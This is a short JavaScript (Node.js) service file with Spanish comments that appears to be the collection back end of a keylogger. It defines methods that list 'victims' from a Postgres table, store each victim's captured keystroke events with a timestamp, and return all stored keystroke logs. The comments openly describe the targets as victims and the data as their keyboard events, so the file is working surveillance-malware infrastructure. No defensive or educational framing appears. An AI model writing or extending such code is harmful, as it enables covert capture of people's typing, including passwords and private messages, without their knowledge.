// Importar las funciones para conectarse con postgres
const getConnection = require('../libs/postgres');

class UserLogService {
  // declarar el contructor de la clase del  servicio  para mandar las acciones del usuario
  constructor() {
  }

  //declarar funcion asincrona para obtener la lista de victimas
  async find() {
  // guartar en un objeto la conexion con la base de datos
    const client = await getConnection();
  // guardar el resultado de el  obtener la lista de vicimas
    const rta = await client.query('SELECT * FROM public.victima');
  // declarar que la funcion retorne la lista de victimas
    return rta;
  }
  // declarar funcion asincrona para guardar en la base de datos los eventos de teclado de las victima
  // recibe como parametro el is de la victima y los ultimos eventos de teclado de la victima
  async postLog(victima_id, log) {
    // crear cariable del tipo fecha
    var today = new Date();
    //guardar en una  variable el año,mes y dia actual. Se añade un +1  al mes por que los meses se cuentan desde enero como mes 0
    var date = today.getFullYear() + '-' + (today.getMonth() + 1) + '-' + today.getDate();
    //guardar en una variable la hora,minuto y segundos actuales.
    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
    //guardar en un objeto la conexion con la base de datos
    const client = await getConnection();
    //ejecutar el guardado de los datos 
    await client.query('INSERT INTO log (victima_id,log,log_date) VALUES ($1,$2,$3)', [victima_id,log,date + ' ' + time]);
  }
  //funcion asincrona para obtener todos los  evento  de tecla
  async getLogList(){
    ////guardar en un objeto la conexion con la base de datos
    const client=await getConnection();
    // ejecutar el obtener los eventos de teclado  de todas  las victima
    const rta= await client.query('SELECT * FROM public.log');
    // retornar el objeto de los eventos de teclado de todas las victimas
    return rta;
  }

}
//exportar el servicio para pulsaciones del usuario
module.exports = UserLogService;